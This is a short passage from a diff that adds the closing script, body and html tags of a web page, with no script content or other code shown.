+</script>
+
+    </body>
+</html>
